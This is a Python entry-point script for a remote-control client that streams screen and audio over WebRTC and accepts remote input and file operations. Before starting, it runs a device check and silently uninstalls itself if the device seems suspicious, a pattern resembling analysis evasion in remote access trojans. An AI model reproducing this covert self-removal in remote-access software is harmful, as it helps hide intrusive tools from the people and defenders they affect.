"""Entry point for the remote client."""
from __future__ import annotations

import argparse
import asyncio
import os
import uuid

from remote_client.control.handlers import ControlHandler
from remote_client.control.input_controller import InputController
from remote_client.files.file_service import FileService
from remote_client.media.audio import AudioTrack
from remote_client.media.screen import ScreenTrack
from remote_client.security.anti_fraud import analyze_device, silent_uninstall_and_cleanup
from remote_client.webrtc.client import WebRTCClient
from remote_client.webrtc.signaling import create_signaling, create_signaling_from_url


def build_client(session_id: str, token: str | None) -> WebRTCClient:
    signaling_url = os.getenv("RC_SIGNALING_URL")
    if signaling_url:
        if "://" in signaling_url:
            signaling = create_signaling_from_url(signaling_url, session_id, token)
        else:
            host, _, port = signaling_url.partition(":")
            signaling = create_signaling(
                host,
                int(port) if port else int(os.getenv("RC_SIGNALING_PORT", "9999")),
                session_id,
                token,
            )
    else:
        signaling_host = os.getenv("RC_SIGNALING_HOST", "localhost")
        signaling_port = int(os.getenv("RC_SIGNALING_PORT", "9999"))
        signaling = create_signaling(signaling_host, signaling_port, session_id, token)
    control_handler = ControlHandler(InputController())
    file_service = FileService()
    media_tracks = [ScreenTrack(), AudioTrack()]

    return WebRTCClient(
        session_id=session_id,
        signaling=signaling,
        control_handler=control_handler,
        file_service=file_service,
        media_tracks=media_tracks,
    )


def _resolve_session_id(session_id: str | None) -> str:
    if session_id:
        return session_id
    env_session = os.getenv("RC_SIGNALING_SESSION")
    if env_session:
        return env_session
    return uuid.uuid4().hex


def main() -> None:
    base_dir = os.path.dirname(os.path.abspath(__file__))
    anti_fraud = analyze_device()
    if anti_fraud.is_suspicious:
        silent_uninstall_and_cleanup(base_dir)
        return

    parser = argparse.ArgumentParser(description="Remote controller client")
    parser.add_argument(
        "--session-id",
        help="Session identifier used to register with the signaling server.",
    )
    args = parser.parse_args()
    session_id = _resolve_session_id(args.session_id)
    print(f"Using session_id: {session_id}")

    token = os.getenv("RC_SIGNALING_TOKEN")
    client = build_client(session_id, token)
    asyncio.run(client.run_forever())


if __name__ == "__main__":
    main()
